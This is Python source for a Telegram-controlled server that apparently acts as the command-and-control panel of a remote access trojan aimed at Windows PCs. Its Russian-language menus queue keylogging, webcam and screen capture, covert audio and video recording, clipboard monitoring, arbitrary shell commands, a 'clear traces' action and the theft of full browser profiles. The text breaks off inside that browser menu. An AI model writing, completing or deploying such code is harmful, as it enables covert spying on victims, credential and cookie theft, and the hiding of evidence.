from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)
import sqlite3
import logging
import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from threading import Thread
import socket
import requests
import base64
import os
from datetime import datetime
from collections import defaultdict
import tempfile
import cv2
import numpy as np
import shutil
from fastapi.staticfiles import StaticFiles
import uuid

bot_instance = None

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

DATABASE = 'pc_control.db'
API_PORT = 4443
ADMIN_IDS = [5276367440]

api = FastAPI()

UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
api.mount("/downloads", StaticFiles(directory=UPLOAD_FOLDER), name="downloads")
upload_progress = defaultdict(dict)

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0

class ServerBot:
    def __init__(self, token):
        self.token = token
        self.application = ApplicationBuilder().token(self.token).build()
        self.setup_handlers()
        self.init_db()

    def init_db(self):
        with sqlite3.connect(DATABASE) as conn:
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS devices
                        (device_id TEXT PRIMARY KEY,
                         name TEXT,
                         ip TEXT,
                         os TEXT,
                         last_seen TIMESTAMP,
                         is_online INTEGER DEFAULT 0)''')
            
            c.execute('''CREATE TABLE IF NOT EXISTS users
                        (user_id INTEGER PRIMARY KEY,
                         username TEXT)''')
            
            c.execute('''CREATE TABLE IF NOT EXISTS commands
                        (id INTEGER PRIMARY KEY AUTOINCREMENT,
                         device_id TEXT,
                         command TEXT,
                         status TEXT DEFAULT 'pending',
                         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')

    def setup_handlers(self):
        self.application.add_handlers([
            CommandHandler("start", self.start_command),
            CommandHandler("devices", self.list_devices_command),
            CallbackQueryHandler(self.callback_handler),
            MessageHandler(filters.TEXT & (~filters.COMMAND), self.text_message_handler),
            MessageHandler(filters.PHOTO, self.photo_message_handler)
        ])

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("⛔ Доступ запрещен")
            return
            
        with sqlite3.connect(DATABASE) as conn:
            conn.execute("INSERT OR IGNORE INTO users VALUES (?, ?)", 
                       (user_id, update.effective_user.username))
        
        keyboard = [
            [InlineKeyboardButton("📋 Список устройств", callback_data="list_devices")],
            [InlineKeyboardButton("🔄 Обновить статус", callback_data="refresh_devices")]
        ]
        
        await update.message.reply_text(
            "🖥️ Панель управления ПК",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    async def list_devices_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("⛔ Доступ запрещен")
            return
            
        await self.show_devices_list(update.effective_chat.id)

    async def show_devices_list(self, chat_id):
        with sqlite3.connect(DATABASE) as conn:
            # Обновить статусы: если last_seen > 2 мин назад, is_online=0
            conn.execute("UPDATE devices SET is_online=0 WHERE last_seen < datetime('now', '-120 seconds')")
            c = conn.cursor()
            c.execute("SELECT device_id, name, ip, last_seen FROM devices")
            devices = c.fetchall()
        now = datetime.now()
        online_devices = []
        for device_id, name, ip, last_seen in devices:
            try:
                last_seen_dt = datetime.strptime(last_seen, "%Y-%m-%d %H:%M:%S")
            except Exception:
                last_seen_dt = now
            is_online = (now - last_seen_dt).total_seconds() < 120
            online_devices.append((device_id, name, ip, is_online))
        if not online_devices:
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Нет подключенных устройств"
            )
            return
        keyboard = [
            [InlineKeyboardButton(
                f"{'🟢' if is_online else '🔴'} {name} ({ip})",
                callback_data=f"device_{device_id}"
            )]
            for device_id, name, ip, is_online in online_devices
        ]
        keyboard.append([InlineKeyboardButton("🔄 Обновить", callback_data="refresh_devices")])
        await self.application.bot.send_message(
            chat_id=chat_id,
            text="Список устройств:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
            
    async def callback_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        if query.data == "list_devices":
            await self.show_devices_list(query.message.chat_id)
        elif query.data == "refresh_devices":
            await self.refresh_devices(query.message.chat_id)
        elif query.data.startswith("device_"):
            await self.handle_device_action(query.message.chat_id, query.data[7:])
        elif query.data.startswith("action_"):
            parts = query.data.split("_")
            device_id = parts[1]
            action = "_".join(parts[2:])
            await self.handle_device_action_command(query.message.chat_id, device_id, action, context)
        elif query.data == "back_to_devices":
            await self.show_devices_list(query.message.chat_id)

    async def text_message_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            return
        if 'show_message_device' in context.user_data:
            device_id = context.user_data.pop('show_message_device')
            text = update.message.text
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command, status, created_at) VALUES (?, ?, 'pending', CURRENT_TIMESTAMP)",
                             (device_id, f"show_message:{text}"))
            await update.message.reply_text(f"Команда 'Показать сообщение' отправлена устройству. Ожидайте...")
            await self.show_devices_list(update.effective_chat.id)
        elif 'hotkey_device' in context.user_data:
            device_id = context.user_data.pop('hotkey_device')
            hotkey = update.message.text.strip().lower()
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"hotkey:{hotkey}"))
            await update.message.reply_text(f"Команда 'hotkey {hotkey}' отправлена устройству. Ожидайте...")
            await self.show_devices_list(update.effective_chat.id)
        elif 'cmd_device' in context.user_data:
            device_id = context.user_data.pop('cmd_device')
            cmd = update.message.text.strip()
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"cmd:{cmd}"))
            await update.message.reply_text(f"Команда 'cmd {cmd}' отправлена устройству. Ожидайте...")
            await self.show_devices_list(update.effective_chat.id)
        elif 'killprocess_device' in context.user_data:
            device_id = context.user_data.pop('killprocess_device')
            proc = update.message.text.strip()
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"killprocess:{proc}"))
            await update.message.reply_text(f"Команда 'killprocess {proc}' отправлена устройству. Ожидайте...")
            await self.show_devices_list(update.effective_chat.id)
        elif 'video_multi_device' in context.user_data:
            device_id = context.user_data.pop('video_multi_device')
            try:
                count = int(update.message.text.strip())
                if count < 1 or count > 10:
                    raise ValueError
            except Exception:
                await update.message.reply_text("Введите число от 1 до 10!")
                context.user_data['video_multi_device'] = device_id
                return
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"record_video_multi:{count}"))
            await update.message.reply_text(f"Команда 'Мультизапись видео x{count}' отправлена устройству. Ожидайте...")
            await self.show_devices_list(update.effective_chat.id)
        elif 'block_site_device' in context.user_data:
            device_id = context.user_data.pop('block_site_device')
            url = update.message.text.strip()
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"block_site:{url}"))
            await update.message.reply_text(f"Сайт {url} будет заблокирован.")
            await self.show_devices_list(update.effective_chat.id)
        elif 'block_app_device' in context.user_data:
            device_id = context.user_data.pop('block_app_device')
            name = update.message.text.strip()
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"block_app:{name}"))
            await update.message.reply_text(f"Приложение {name} будет заблокировано (завершено).")
            await self.show_devices_list(update.effective_chat.id)

    async def photo_message_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            return
        if 'open_image_device' in context.user_data:
            device_id = context.user_data.pop('open_image_device')
            photo = update.message.photo[-1]
            file = await photo.get_file()
            file_bytes = await file.download_as_bytearray()
            img_b64 = base64.b64encode(file_bytes).decode('utf-8')
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"open_image:{img_b64}"))
            await update.message.reply_text("Команда 'Открыть картинку' отправлена устройству. Ожидайте...")
            await self.show_devices_list(update.effective_chat.id)

    async def refresh_devices(self, chat_id):
        await self.application.bot.send_message(
            chat_id=chat_id,
            text="🔄 Обновление статуса устройств..."
        )
        await self.show_devices_list(chat_id)

    async def handle_device_action(self, chat_id, device_id):
        with sqlite3.connect(DATABASE) as conn:
            c = conn.cursor()
            c.execute("SELECT name, is_online FROM devices WHERE device_id=?", (device_id,))
            device = c.fetchone()
        
        if not device:
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Устройство не найдено"
            )
            return
            
        name, is_online = device
        
        if is_online:
            keyboard = [
                [InlineKeyboardButton("📷 Мультимедиа", callback_data=f"action_{device_id}_media_menu")],
                [InlineKeyboardButton("💻 Управление", callback_data=f"action_{device_id}_control_menu")],
                [InlineKeyboardButton("⚙️ Система", callback_data=f"action_{device_id}_system_menu")],
                [
                    InlineKeyboardButton("🔙 Назад", callback_data="back_to_devices"),
                    InlineKeyboardButton("🏠 Главное", callback_data="back_to_devices")
                ]
            ]
            
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"Управление устройством: {name}\nСтатус: онлайн",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"Устройство {name} в настоящее время недоступно",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data="back_to_devices")]]
                ))

    async def handle_device_action_command(self, chat_id, device_id, action, context):
        if action == "media_menu":
            keyboard = [
                [InlineKeyboardButton("🖼️ Скриншот", callback_data=f"action_{device_id}_screenshot")],
                [InlineKeyboardButton("📸 Веб-камера", callback_data=f"action_{device_id}_webcam")],
                [InlineKeyboardButton("🎥 Запись видео (10 сек)", callback_data=f"action_{device_id}_record_video_10")],
                [InlineKeyboardButton("🎥 Мультизапись видео", callback_data=f"action_{device_id}_record_video_multi")],
                [InlineKeyboardButton("🎤 Запись звука (10 сек)", callback_data=f"action_{device_id}_record_audio_10")],
                [InlineKeyboardButton("🖼️ Открыть картинку", callback_data=f"action_{device_id}_open_image")],
                [InlineKeyboardButton("🔊 +10%", callback_data=f"action_{device_id}_volume_up_10")],
                [InlineKeyboardButton("🔉 -10%", callback_data=f"action_{device_id}_volume_down_10")],
                [InlineKeyboardButton("🔇 Mute", callback_data=f"action_{device_id}_volume_mute")],
                [
                    InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}"),
                    InlineKeyboardButton("🏠 Главное", callback_data="back_to_devices")
                ]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Мультимедиа функции:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        elif action == "record_video_multi":
            # Запросить у пользователя количество видео
            context.user_data['video_multi_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Введите количество видео для записи (по 10 сек каждое):"
            )
        elif action.startswith("record_video_multi_"):
            # Принять число и отправить команду
            count = action.split('_')[-1]
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"record_video_multi:{count}"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"Команда 'Мультизапись видео x{count}' отправлена устройству. Ожидайте...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
                ]))
        elif action == "windows_menu":
            # Получить список окон
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "list_windows"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Команда 'Получить список окон' отправлена устройству. Ожидайте...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
                ]))
        elif action.startswith("window_action_"):
            # window_action_{hwnd}_{act}
            parts = action.split('_')
            hwnd = parts[2]
            act = parts[3]
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"window_action:{hwnd}:{act}"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"Команда для окна {hwnd} ({act}) отправлена устройству.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
                ]))
        elif action == "system_info":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "system_info"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Команда 'Информация о системе' отправлена устройству. Ожидайте...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
                ]))
        elif action == "volume_up_10":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "volume_up_10"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Команда 'Громкость +10%' отправлена устройству.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
                ]))
        elif action == "volume_down_10":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "volume_down_10"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Команда 'Громкость -10%' отправлена устройству.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
                ]))
        elif action == "volume_mute":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "volume_mute"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Команда 'Mute' отправлена устройству.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
                ]))
        elif action == "control_menu":
            keyboard = [
                [InlineKeyboardButton("🖱️ Клик мыши", callback_data=f"action_{device_id}_mouse_click")],
                [InlineKeyboardButton("🔣 Комбинация клавиш", callback_data=f"action_{device_id}_hotkey_menu")],
                [InlineKeyboardButton("📺 Вывести сообщение", callback_data=f"action_{device_id}_show_message")],
                [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Функции управления:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action == "hotkey_menu":
            keyboard = [
                [InlineKeyboardButton("Alt+F4", callback_data=f"action_{device_id}_hotkey:alt+f4")],
                [InlineKeyboardButton("Ctrl+Alt+Del", callback_data=f"action_{device_id}_hotkey:ctrl+alt+delete")],
                [InlineKeyboardButton("Win+L", callback_data=f"action_{device_id}_hotkey:win+l")],
                [InlineKeyboardButton("Ctrl+Shift+Esc", callback_data=f"action_{device_id}_hotkey:ctrl+shift+esc")],
                [InlineKeyboardButton("Ввести свою комбинацию", callback_data=f"action_{device_id}_hotkey_custom")],
                [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_control_menu")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Выберите комбинацию клавиш или введите свою:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action.startswith("hotkey:"):
            hotkey = action.split(":", 1)[1].lower()
            if hotkey in ["win+l", "win+L"]:
                with sqlite3.connect(DATABASE) as conn:
                    conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                                 (device_id, "lock"))
                await self.application.bot.send_message(
                    chat_id=chat_id,
                    text=f"Команда 'Блокировка экрана (Win+L)' отправлена устройству. Ожидайте...",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_hotkey_menu")]
                    ]))
            elif hotkey in ["ctrl+alt+delete", "ctrl+alt+del"]:
                await self.application.bot.send_message(
                    chat_id=chat_id,
                    text="Ошибка: Ctrl+Alt+Delete нельзя эмулировать программно в Windows.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_hotkey_menu")]
                    ]))
            else:
                with sqlite3.connect(DATABASE) as conn:
                    conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                                 (device_id, f"hotkey:{hotkey}"))
                await self.application.bot.send_message(
                    chat_id=chat_id,
                    text=f"Команда 'hotkey {hotkey}' отправлена устройству. Ожидайте...",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_hotkey_menu")]
                    ]))
        elif action == "hotkey_custom":
            context.user_data['hotkey_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Введите свою комбинацию клавиш (например: ctrl+shift+esc):")
        elif action == "system_menu":
            keyboard = [
                [InlineKeyboardButton("📁 Файлы", callback_data=f"action_{device_id}_files_menu")],
                [InlineKeyboardButton("💻 Командная строка", callback_data=f"action_{device_id}_cmd_menu")],
                [InlineKeyboardButton("📜 Список процессов", callback_data=f"action_{device_id}_processes")],
                [InlineKeyboardButton("❌ Завершить процесс", callback_data=f"action_{device_id}_killprocess")],
                [InlineKeyboardButton("🔒 Заблокировать", callback_data=f"action_{device_id}_lock")],
                [InlineKeyboardButton("💤 Спящий режим", callback_data=f"action_{device_id}_sleep")],
                [InlineKeyboardButton("🔌 Выключить", callback_data=f"action_{device_id}_shutdown")],
                [InlineKeyboardButton("🔄 Перезагрузить", callback_data=f"action_{device_id}_reboot")],
                [InlineKeyboardButton("📝 Кейлоггер", callback_data=f"action_{device_id}_keylogger_menu")],
                [InlineKeyboardButton("🖱️ Мониторинг мыши", callback_data=f"action_{device_id}_mouse_menu")],
                [InlineKeyboardButton("🗔 Окна", callback_data=f"action_{device_id}_windows_menu")],
                [InlineKeyboardButton("📋 Буфер обмена", callback_data=f"action_{device_id}_clipboard_monitor")],
                [InlineKeyboardButton("🗂️ Приложения", callback_data=f"action_{device_id}_apps_monitor")],
                [InlineKeyboardButton("🧹 Очистить следы", callback_data=f"action_{device_id}_clear_traces")],
                [InlineKeyboardButton("🚫 Блокировка сайта", callback_data=f"action_{device_id}_block_site")],
                [InlineKeyboardButton("🚫 Блокировка приложения", callback_data=f"action_{device_id}_block_app")],
                [InlineKeyboardButton("🎤 Длительная запись аудио", callback_data=f"action_{device_id}_audio_menu")],
                [
                    InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}"),
                    InlineKeyboardButton("🏠 Главное", callback_data="back_to_devices")
                ]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Системные функции:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action == "keylogger_menu":
            keyboard = [
                [InlineKeyboardButton("▶️ Старт", callback_data=f"action_{device_id}_keylogger_start")],
                [InlineKeyboardButton("⏹️ Стоп", callback_data=f"action_{device_id}_keylogger_stop")],
                [InlineKeyboardButton("📤 Выгрузить", callback_data=f"action_{device_id}_keylogger_dump")],
                [InlineKeyboardButton("🧹 Очистить", callback_data=f"action_{device_id}_keylogger_clear")],
                [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Кейлоггер:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action == "keylogger_start":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "keylogger_start"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Кейлоггер запущен.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_keylogger_menu")]
                ]))
        elif action == "keylogger_stop":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "keylogger_stop"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Кейлоггер остановлен.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_keylogger_menu")]
                ]))
        elif action == "keylogger_dump":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "keylogger_dump"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Лог кейлоггера будет отправлен.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_keylogger_menu")]
                ]))
        elif action == "keylogger_clear":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "keylogger_clear"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Лог кейлоггера очищен.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_keylogger_menu")]
                ]))
        elif action == "mouse_menu":
            keyboard = [
                [InlineKeyboardButton("▶️ Старт", callback_data=f"action_{device_id}_mouse_monitor_start")],
                [InlineKeyboardButton("⏹️ Стоп", callback_data=f"action_{device_id}_mouse_monitor_stop")],
                [InlineKeyboardButton("📤 Выгрузить", callback_data=f"action_{device_id}_mouse_monitor_dump")],
                [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Мониторинг мыши:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action == "mouse_monitor_start":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "mouse_monitor_start"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Мониторинг мыши запущен.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_mouse_menu")]
                ]))
        elif action == "mouse_monitor_stop":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "mouse_monitor_stop"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Мониторинг мыши остановлен.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_mouse_menu")]
                ]))
        elif action == "mouse_monitor_dump":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "mouse_monitor_dump"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Лог мыши будет отправлен.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_mouse_menu")]
                ]))
        elif action == "apps_monitor":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "apps_monitor"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Список приложений будет отправлен.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
                ]))
        elif action == "clipboard_monitor":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "clipboard_monitor"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Буфер обмена будет отправлен.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
                ]))
        elif action == "clear_traces":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "clear_traces"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Команда очистки следов отправлена.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
                ]))
        elif action == "block_site":
            context.user_data['block_site_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Введите домен сайта для блокировки (например: vk.com):"
            )
        elif action == "block_app":
            context.user_data['block_app_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Введите имя процесса для блокировки (например: chrome.exe):"
            )
        elif action == "audio_menu":
            keyboard = [
                [InlineKeyboardButton("▶️ Начать запись", callback_data=f"action_{device_id}_record_audio_start")],
                [InlineKeyboardButton("⏹️ Остановить запись", callback_data=f"action_{device_id}_record_audio_stop")],
                [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Длительная запись аудио:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action == "record_audio_start":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "record_audio_start"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Длительная запись аудио начата.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_audio_menu")]
                ]))
        elif action == "record_audio_stop":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "record_audio_stop"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Остановка и отправка аудиозаписи.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_audio_menu")]
                ]))
        elif action == "cmd_menu":
            keyboard = [
                [InlineKeyboardButton("ipconfig", callback_data=f"action_{device_id}_cmd:ipconfig")],
                [InlineKeyboardButton("tasklist", callback_data=f"action_{device_id}_cmd:tasklist")],
                [InlineKeyboardButton("Ввести свою команду", callback_data=f"action_{device_id}_cmd_custom")],
                [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Выберите команду или введите свою:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action.startswith("cmd:"):
            cmd = action.split(":", 1)[1]
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, f"cmd:{cmd}"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"Команда 'cmd {cmd}' отправлена устройству. Ожидайте...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_cmd_menu")]
                ]))
        elif action == "cmd_custom":
            context.user_data['cmd_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Введите команду для выполнения в консоли:")
        elif action == "processes":
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                             (device_id, "processes"))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"Команда 'processes' отправлена устройству. Ожидайте...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
                ]))
        elif action == "killprocess":
            context.user_data['killprocess_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Введите имя процесса (например: explorer.exe) или pid:")
        elif action == "open_image":
            context.user_data['open_image_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Отправьте изображение, которое нужно открыть на устройстве:")
        elif action == "show_message":
            context.user_data['show_message_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Введите текст, который нужно вывести на экране устройства:")
            
        elif action in ["screenshot", "webcam", "record_video_10", "record_audio_10", 
                       "mouse_click", "lock", "sleep", "shutdown", "reboot"]:
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                           (device_id, action))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"Команда '{action}' отправлена устройству. Ожидайте...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
                ])
            )

        elif action == "files_menu":
            keyboard = [
                [InlineKeyboardButton("📁 Рабочий стол", callback_data=f"action_{device_id}_ls:desktop")],
                [InlineKeyboardButton("📥 Загрузки", callback_data=f"action_{device_id}_ls:downloads")],
                [InlineKeyboardButton("📄 Документы", callback_data=f"action_{device_id}_ls:documents")],
                [InlineKeyboardButton("🌐 Браузеры", callback_data=f"action_{device_id}_browsers_menu")],
                [InlineKeyboardButton("🔙 Назад", callback_data=f"action_{device_id}_system_menu")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Файловый менеджер:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action == "browsers_menu":
            keyboard = [
                [InlineKeyboardButton("Google Chrome (полный профиль)", callback_data=f"action_{device_id}_browser_full:chrome")],
                [InlineKeyboardButton("Microsoft Edge (полный профиль)", callback_data=f"action_{device_id}_browser_full:edge")],
                [InlineKeyboardButton("Opera (полный профиль)", callback_data=f"action_{device_id}_browser_full:opera")],
